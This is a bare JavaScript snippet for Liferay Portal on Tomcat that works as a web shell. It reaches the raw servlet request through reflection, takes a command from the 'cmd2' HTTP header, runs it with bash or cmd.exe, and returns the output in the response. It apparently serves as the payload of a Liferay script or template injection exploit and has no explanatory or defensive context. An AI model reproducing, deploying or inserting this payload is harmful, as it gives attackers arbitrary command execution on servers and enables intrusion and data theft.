var currentThread = com.liferay.portal.service.ServiceContextThreadLocal.getServiceContext();
var isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
var request = currentThread.getRequest();
var _req = org.apache.catalina.connector.RequestFacade.class.getDeclaredField("request");
_req.setAccessible(true);
var realRequest = _req.get(request);
var response = realRequest.getResponse();
var outputStream = response.getOutputStream();
var cmd = new java.lang.String(request.getHeader("cmd2"));
var listCmd = new java.util.ArrayList();
var p = new java.lang.ProcessBuilder();
if(isWin){
    p.command("cmd.exe", "/c", cmd);
} else {
    p.command("bash", "-c", cmd);
}
p.redirectErrorStream(true);
var process = p.start();
var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());
var bufferedReader = new java.io.BufferedReader(inputStreamReader);
var line = "";
var fullText = "";
while((line = bufferedReader.readLine()) != null){
    fullText = fullText + line + "\n";
}
var bytes = fullText.getBytes("UTF-8");
outputStream.write(bytes);
outputStream.close();
